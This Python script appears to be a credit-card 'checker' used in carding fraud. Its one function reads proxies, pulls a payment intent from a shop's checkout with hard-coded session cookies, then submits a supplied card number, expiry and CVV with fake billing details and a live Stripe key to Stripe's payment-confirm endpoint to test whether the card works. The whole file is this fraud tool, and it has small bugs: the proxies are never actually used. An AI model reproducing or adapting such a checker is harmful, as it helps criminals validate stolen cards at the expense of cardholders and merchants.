import requests

def chks(cc, mes,ano,cvv):
    with open('proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        bock =  {'http': f'{proxs}', 'https': f'{proxs}'}
    cookies = {
        '_ga_5715CSHD4Q': 'GS1.1.1691974451.1.0.1691974451.0.0.0',
        '_ga': 'GA1.2.1250007462.1691974451',
        '_gid': 'GA1.2.42587777.1691974451',
        '__stripe_mid': 'd096dfd3-3ebf-4309-b4c3-358c600aab9b3c8519',
        '__stripe_sid': 'a2ca52ee-cb12-4e9f-b543-77da11e20a3eb056d7',
        '_gat_gtag_UA_170072018_1': '1',
        'cv2_0:663978-586837': '1',
    }

    headers = {
        'authority': 'handshake.fun',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9',
        'referer': 'https://handshake.fun/cart/checkout/586837',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    response = requests.get('https://handshake.fun/_api/v0/ecommerce/v2/orders/586837/getintent', cookies=cookies, headers=headers)
    if not response:
        arrro = 'Erro ccs'
        return arrro.text   
    else:
        idw = response.json()['id']
        client = response.json()['client_secret']

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = f'payment_method_data[type]=card&payment_method_data[billing_details][address][city]=ny&payment_method_data[billing_details][address][country]=ES&payment_method_data[billing_details][address][line1]=strett+345&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10010&payment_method_data[billing_details][address][state]=CU&payment_method_data[billing_details][email]=sdfbwdfgb%40fgmai.com&payment_method_data[billing_details][name]=Juan+manuel&payment_method_data[billing_details][phone]=14523252311&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=bfc38c7a-bfea-4b6d-9414-ac2f21463eceb64cc8&payment_method_data[muid]=d096dfd3-3ebf-4309-b4c3-358c600aab9b3c8519&payment_method_data[sid]=a2ca52ee-cb12-4e9f-b543-77da11e20a3eb056d7&payment_method_data[payment_user_agent]=stripe.js%2F814c622cf5%3B+stripe-js-v3%2F814c622cf5%3B+split-card-element&payment_method_data[time_on_page]=99461&key=pk_live_51GUVyNJGRAM5r1mxCPWhNXj8AdzUKmKZTfj3pXot2Wo5u8noQ25CxLzMUTpAlq41eJYBECAOvjQOHncvJQTvvKAP00xgtgFAJA&client_secret={client}'

        chka = requests.post(f'https://api.stripe.com/v1/payment_intents/{idw}/confirm',headers=headers,data=data)
        return chka
